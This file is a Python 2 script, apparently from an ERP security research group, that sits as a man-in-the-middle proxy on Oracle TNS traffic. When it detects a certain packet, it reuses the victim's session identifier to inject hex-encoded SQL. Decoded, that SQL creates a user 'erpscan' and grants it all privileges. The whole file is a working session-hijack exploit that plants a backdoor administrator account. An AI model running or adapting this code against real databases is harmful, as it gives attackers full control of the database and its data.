#python2.7
# Changing the buffer_size and delay, you can improve the speed and bandwidth.
# But when buffer get to high or delay go too down, you can broke things
__authors__ = "Shikari,elkey"
#DSECRG

import socket
import select
import time
import sys
import re
from argparse import ArgumentParser

parser = ArgumentParser()
parser.add_argument("-f", dest="ip_forward", type=str, help="forward_ip")
parser.add_argument("-pf", dest="forward_port",type=int,help="forward_port")
parser.add_argument("-s", dest="ip_server", type=str, help="server_ip")
parser.add_argument("-ps", dest="server_port",type=int,help="server_port")
parser.add_argument("-e", dest="EXAMPLE", help="python tnsmitm.py -f 172.16.2.33 -pf 1521 -s 172.16.2.61 -ps 1521")
args = parser.parse_args()

buffer_size = 4096
delay = 0.0001
forward_to = (args.ip_forward,args.forward_port)
big = []

class Forward:
    def __init__(self):
        self.forward = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def start(self, host, port):
        try:
            self.forward.connect((host, port))
            return self.forward
        except Exception, e:
            print e
            return False

class TheServer:
    input_list = []
    channel = {}

    def __init__(self, host, port):
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server.bind((host, port))
        self.server.listen(200)

    def main_loop(self):
        self.input_list.append(self.server)
        while 1:
            time.sleep(delay)
            ss = select.select
            inputready, outputready, exceptready = ss(self.input_list, [], [])
            for self.s in inputready:
                if self.s == self.server:
                    self.on_accept()
                    break

                self.data = self.s.recv(buffer_size)
                if len(self.data) == 0:
                    self.on_close()
                else:
                    self.on_recv()

            
    def on_accept(self):
        forward = Forward().start(forward_to[0], forward_to[1])
        clientsock, clientaddr = self.server.accept()
        if forward:
            print clientaddr, "has connected"
            self.input_list.append(clientsock)
            self.input_list.append(forward)
            self.channel[clientsock] = forward
            self.channel[forward] = clientsock
        else:
            print "Can't establish connection with remote server.",
            print "Closing connection with client side", clientaddr
            clientsock.close()

    def on_close(self):
        print self.s.getpeername(), "has disconnected"
        #remove objects from input_list
        self.input_list.remove(self.s)
        self.input_list.remove(self.channel[self.s])
        out = self.channel[self.s]
        # close the connection with client
        self.channel[out].close()  # equivalent to do self.s.close()
        # close the connection with remote server
        self.channel[self.s].close()
        # delete both objects from channel dict
        del self.channel[out]
        del self.channel[self.s]

    def on_recv(self):
        data = self.data
        massiv = data.split('\\')
        big.append(massiv)
        print "______________________________________________________________________________"
        poisk = re.search(r'\x00\x0d\x00\x00\x06\x00\x00\x00\x00\x00\x03\x0e\x14',data, re.M|re.I)
        if poisk:
	    data1 = "\x00\xea\x00\x00\x06\x00\x00\x00\x00\x00\x11\x69\x22\xfe\xff\xff\xff\x01\x00\x00\x00\x06\x00\x00\x00\x03\x5e\x23\x21\x80\x00\x00\x00\x00\x00\x00\xfe\xff\xff\xff\x29\x00\x00\x00\xfe\xff\xff\xff\x0d\x00\x00\x00\xfe\xff\xff\xff\xfe\xff\xff\xff\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xfe\xff\xff\xff\x00\x00\x00\x00\xfe\xff\xff\xff\xfe\xff\xff\xff\x20\x20"+big[17][0][87]+"\x09\x00\x00\x00\x00\x00\x00\x00\x00\xfe\xff\xff\xff\xfe\xff\xff\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x29\x63\x72\x65\x61\x74\x65\x20\x75\x73\x65\x72\x20\x65\x72\x70\x73\x63\x61\x6e\x20\x69\x64\x65\x6e\x74\x69\x66\x69\x65\x64\x20\x62\x79\x20\x65\x72\x70\x73\x63\x61\x6e\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	    data2 = "\x00\xe0\x00\x00\x06\x00\x00\x00\x00\x00\x11\x69\x16\xfe\xff\xff\xff\x01\x00\x00\x00\x03\x00\x00\x00\x03\x5e\x17\x21\x00\x00\x00\x00\x00\x00\x00\xfe\xff\xff\xff\x1f\x00\x00\x00\xfe\xff\xff\xff\x0d\x00\x00\x00\xfe\xff\xff\xff\xfe\xff\xff\xff\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xfe\xff\xff\xff\x00\x00\x00\x00\xfe\xff\xff\xff\xfe\xff\xff\xff\x20\x20"+big[17][0][87]+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\xfe\xff\xff\xff\xfe\xff\xff\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x1f\x67\x72\x61\x6e\x74\x20\x61\x6c\x6c\x20\x70\x72\x69\x76\x69\x6c\x65\x67\x65\x73\x20\x74\x6f\x20\x65\x72\x70\x73\x63\x61\x6e\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
            print "Send your command"
            self.channel[self.s].send(data1)  
	    time.sleep(1)
	    self.channel[self.s].send(data2)  
            print "+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"    
            print  big[17][0][87] # Identifikator sessii
            print "+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"

        print data +"from client"
        self.channel[self.s].send(data)
  
if __name__ == '__main__':
        server = TheServer(args.ip_server,args.server_port)
        try:
            server.main_loop()
        except KeyboardInterrupt:
            print "Ctrl C - Stopping server"
            sys.exit(1)
